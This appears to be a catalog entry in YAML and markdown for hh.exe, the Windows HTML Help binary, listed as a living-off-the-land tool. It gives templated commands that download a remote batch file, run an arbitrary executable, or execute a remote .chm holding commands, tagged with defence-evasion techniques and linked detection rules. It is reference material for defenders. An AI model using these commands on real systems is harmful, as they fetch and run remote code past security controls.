---
id: windows-execution-hh
namespace: windows:execution:hh
name: hh
description: 'Binary used for processing chm files in Windows Located at: C:\Windows\hh.exe; C:\Windows\SysWOW64\hh.exe.'
author: Oddvar Moe
version: 1.0.0
capabilities:
- network.transfer.download
- security.execution.command
platforms:
- windows
risk_level: high
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - network_traffic
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: medium
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: medium
  disk_io: low
allowed-tools:
- hh
parameters: []
features: []
execution:
  template: hh
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Open the target batch script with HTML Help. (Download files from url)
  command: HH.exe {REMOTEURL:.bat}
- description: Executes specified executable with HTML Help. (Execute process with HH.exe)
  command: HH.exe {PATH_ABSOLUTE:.exe}
- description: Executes a remote .chm file which can contain commands. (Execute commands with HH.exe)
  command: HH.exe {REMOTEURL:.chm}
references:
- label: ''
  url: https://oddvar.moe/2017/08/13/bypassing-device-guard-umci-using-chm-cve-2017-8625/
techniques:
- exfiltration
- execution
- defense-evasion
mitre_ids:
- T1105
- T1218.001
detections:
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_hh_chm_execution.yml
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_hh_html_help_susp_child_process.yml
- type: elastic
  url: https://github.com/elastic/detection-rules/blob/ef7548f04c4341e0d1a172810330d59453f46a21/rules/windows/execution_via_compiled_html_file.toml
- type: elastic
  url: https://github.com/elastic/detection-rules/blob/61afb1c1c0c3f50637b1bb194f3e6fb09f476e50/rules/windows/execution_html_help_executable_program_connecting_to_the_internet.toml
- type: splunk
  url: https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/detect_html_help_spawn_child_process.yml
- type: splunk
  url: https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/detect_html_help_url_in_command_line.yml
install:
- method: choco
  package_name: hh
  commands:
  - choco install hh
---


# hh

hh is a Windows LOLBin. Binary used for processing chm files in Windows Located at: C:\Windows\hh.exe; C:\Windows\SysWOW64\hh.exe.
